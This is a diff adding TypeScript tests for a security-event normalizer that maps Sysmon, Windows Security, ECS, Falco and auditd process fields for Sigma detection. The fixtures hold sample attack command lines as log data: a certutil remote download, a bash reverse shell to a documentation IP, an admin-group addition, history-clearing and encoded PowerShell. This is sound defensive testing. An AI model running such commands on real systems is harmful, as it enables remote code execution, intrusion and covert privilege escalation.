@@ -202,3 +202,131 @@ describe("GenericNormalizer", () => {
     });
   });
 });
+
+/*
+ * Arbitrary JSON names a process every way there is: Sysmon's own field
+ * names, the Windows Security log's, ECS objects, Falco's dotted
+ * output_fields, auditd's comm and exe, Splunk's CIM `process`. Each lands
+ * on the process fields Sigma's Image and CommandLine read.
+ */
+describe("GenericNormalizer: the process an event is about", () => {
+  test("Sysmon's field names, flat", () => {
+    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
+      EventID: 1,
+      Image: "C:\\Windows\\System32\\certutil.exe",
+      CommandLine: "certutil.exe -urlcache -f http://203.0.113.7/a.exe",
+      ParentImage: "C:\\Windows\\System32\\cmd.exe",
+      ParentCommandLine: '"C:\\Windows\\system32\\cmd.exe"',
+    });
+
+    expect(result.processPath).toBe("C:\\Windows\\System32\\certutil.exe");
+    expect(result.processName).toBe("certutil.exe");
+    expect(result.processCommandLine).toBe(
+      "certutil.exe -urlcache -f http://203.0.113.7/a.exe",
+    );
+    expect(result.parentProcessPath).toBe("C:\\Windows\\System32\\cmd.exe");
+    expect(result.parentProcessName).toBe("cmd.exe");
+    expect(result.parentProcessCommandLine).toBe(
+      '"C:\\Windows\\system32\\cmd.exe"',
+    );
+  });
+
+  test("the Windows Security log's 4688, whose process names are full paths", () => {
+    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
+      EventID: 4688,
+      NewProcessName: "C:\\Windows\\System32\\net.exe",
+      ParentProcessName: "C:\\Windows\\System32\\cmd.exe",
+      CommandLine: "net localgroup administrators svc_backup /add",
+    });
+
+    expect(result.processPath).toBe("C:\\Windows\\System32\\net.exe");
+    expect(result.processName).toBe("net.exe");
+    expect(result.parentProcessPath).toBe("C:\\Windows\\System32\\cmd.exe");
+    expect(result.parentProcessName).toBe("cmd.exe");
+  });
+
+  test("ECS objects, nested or dotted", () => {
+    const nested: NormalizedSecurityEvent = GenericNormalizer.normalize({
+      process: {
+        name: "bash",
+        executable: "/usr/bin/bash",
+        command_line: "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+        parent: { name: "php-fpm8.2", command_line: "php-fpm: pool www" },
+      },
+    });
+    const dotted: NormalizedSecurityEvent = GenericNormalizer.normalize({
+      "process.name": "bash",
+      "process.executable": "/usr/bin/bash",
+      "process.command_line": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+      "process.parent.name": "php-fpm8.2",
+      "process.parent.command_line": "php-fpm: pool www",
+    });
+
+    for (const result of [nested, dotted]) {
+      expect(result.processName).toBe("bash");
+      expect(result.processPath).toBe("/usr/bin/bash");
+      expect(result.processCommandLine).toBe(
+        "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+      );
+      expect(result.parentProcessName).toBe("php-fpm8.2");
+      expect(result.parentProcessCommandLine).toBe("php-fpm: pool www");
+    }
+  });
+
+  test("Falco's alert, whose output_fields keys hold dots", () => {
+    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
+      output: "Terminal shell in container",
+      priority: "Notice",
+      rule: "Terminal shell in container",
+      output_fields: {
+        "proc.name": "bash",
+        "proc.exepath": "/usr/bin/bash",
+        "proc.cmdline": "bash -c unset HISTFILE",
+        "proc.pname": "runc",
+        "proc.pcmdline": "runc init",
+      },
+    });
+
+    expect(result.processName).toBe("bash");
+    expect(result.processPath).toBe("/usr/bin/bash");
+    expect(result.processCommandLine).toBe("bash -c unset HISTFILE");
+    expect(result.parentProcessName).toBe("runc");
+    expect(result.parentProcessCommandLine).toBe("runc init");
+  });
+
+  test("auditd's comm and exe", () => {
+    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
+      type: "SYSCALL",
+      comm: "cat",
+      exe: "/usr/bin/cat",
+    });
+
+    expect(result.processName).toBe("cat");
+    expect(result.processPath).toBe("/usr/bin/cat");
+  });
+
+  test("a plain `process` string is the command line, last of all, and still the principal process", () => {
+    const plain: NormalizedSecurityEvent = GenericNormalizer.normalize({
+      process: "powershell.exe -enc JABzAD0A",
+    });
+    const explicit: NormalizedSecurityEvent = GenericNormalizer.normalize({
+      process: "powershell.exe",
+      command_line: "powershell.exe -enc JABzAD0A",
+    });
+
+    expect(plain.processCommandLine).toBe("powershell.exe -enc JABzAD0A");
+    expect(plain.principalProcess).toBe("powershell.exe -enc JABzAD0A");
+    expect(explicit.processCommandLine).toBe("powershell.exe -enc JABzAD0A");
+  });
+
+  test("a lowercase `image` is a container's as often as a process's, so it is left in the attributes", () => {
+    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
+      image: "docker.io/library/nginx:1.27",
+      container_id: "4f2a",
+    });
+
+    expect(result.processPath).toBe("");
+    expect(result.processName).toBe("");
+    expect(result.attributes["image"]).toBe("docker.io/library/nginx:1.27");
+  });
+});
